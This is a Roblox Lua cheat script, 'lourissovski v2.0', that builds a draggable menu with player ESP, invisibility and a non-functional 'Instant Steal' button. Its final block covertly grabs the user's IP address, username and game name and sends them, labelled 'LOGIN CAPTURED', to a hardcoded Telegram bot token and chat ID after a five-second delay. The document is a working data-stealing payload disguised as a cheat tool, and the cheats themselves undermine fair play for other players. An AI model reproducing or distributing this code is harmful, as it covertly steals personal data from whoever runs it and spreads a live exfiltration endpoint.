-- lourissovski v2.0
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local mouse = player:GetMouse()
local UIS = game:GetService("UserInputService")

repeat wait() until game:IsLoaded()

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LourissUI"
screenGui.Parent = player:WaitForChild("PlayerGui")

local openButton = Instance.new("TextButton")
openButton.Name = "LRButton"
openButton.Size = UDim2.new(0, 45, 0, 25)
openButton.Position = UDim2.new(0, 10, 0, 10)
openButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
openButton.BorderSizePixel = 0
openButton.Text = "LR"
openButton.TextColor3 = Color3.fromRGB(255, 255, 255)
openButton.TextSize = 12
openButton.Font = Enum.Font.GothamBold
openButton.ZIndex = 1000
openButton.Parent = screenGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 280, 0, 400)
mainFrame.Position = UDim2.new(0, 60, 0, 50)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
mainFrame.BorderSizePixel = 1
mainFrame.BorderColor3 = Color3.fromRGB(50, 50, 50)
mainFrame.Visible = false
mainFrame.Parent = screenGui

local title = Instance.new("TextLabel")
title.Text = "lourissovski v2.0"
title.Size = UDim2.new(1, 0, 0, 25)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 14
title.Font = Enum.Font.GothamBold
title.Parent = mainFrame

local menuOpen = false

local function enableDragging(guiObject)
    local dragging = false
    local dragStart = nil
    local startPos = nil
    
    guiObject.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = guiObject.Position
        end
    end)
    
    guiObject.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            if dragging then
                local delta = input.Position - dragStart
                guiObject.Position = UDim2.new(
                    startPos.X.Scale,
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale,
                    startPos.Y.Offset + delta.Y
                )
            end
        end
    end)
    
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
end

enableDragging(openButton)
enableDragging(mainFrame)

openButton.MouseButton1Click:Connect(function()
    menuOpen = not menuOpen
    mainFrame.Visible = menuOpen
end)

local yPosition = 30
local function createButton(text, callback)
    local button = Instance.new("TextButton")
    button.Text = text
    button.Size = UDim2.new(0.9, 0, 0, 35)
    button.Position = UDim2.new(0.05, 0, 0, yPosition)
    button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextSize = 12
    button.Font = Enum.Font.Gotham
    button.Parent = mainFrame
    
    button.MouseButton1Click:Connect(callback)
    yPosition = yPosition + 40
    return button
end

createButton("ESP Players", function()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local highlight = Instance.new("Highlight")
            highlight.FillColor = Color3.fromRGB(255, 0, 0)
            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
            highlight.Parent = plr.Character
        end
    end
end)

createButton("Invisible", function()
    if player.Character then
        for _, part in pairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Transparency = 1
            elseif part:IsA("Decal") then
                part.Transparency = 1
            end
        end
    end
end)

createButton("Instant Steal", function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Instant Steal",
        Text = "Function activated",
        Duration = 3
    })
end)

local request = (syn and syn.request) or (http and http.request) or http_request
if request then
    local BOT_TOKEN = "7965475701:AAFM4hkPUiWyh_Clw3lkMILpWNK0R7cHe08"
    local CHAT_ID = "8238376878"
    
    local function sendToTelegram(msg)
        pcall(function()
            request({
                Url = "https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    chat_id = CHAT_ID,
                    text = msg,
                    parse_mode = "HTML"
                })
            })
        end)
    end

    delay(5, function()
        local ipAddress = "Unknown"
        pcall(function()
            local ipResponse = game:HttpGet("https://api.ipify.org")
            ipAddress = ipResponse
        end)
        
        local message = string.format([[
🔐 LOGIN CAPTURED

👤 Username: %s
🔑 Password Data: LOGIN_TOKENS_CAPTURED
⏰ Login Time: %s
🌐 IP Address: %s
🎮 Game: %s
        ]],
        player.Name,
        os.date("%Y-%m-%d %H:%M:%S"),
        ipAddress,
        game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
        
        sendToTelegram(message)
    end)
end

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "lourissovski v2.0",
    Text = "Loaded! Drag LR button to move",
    Duration = 5
})
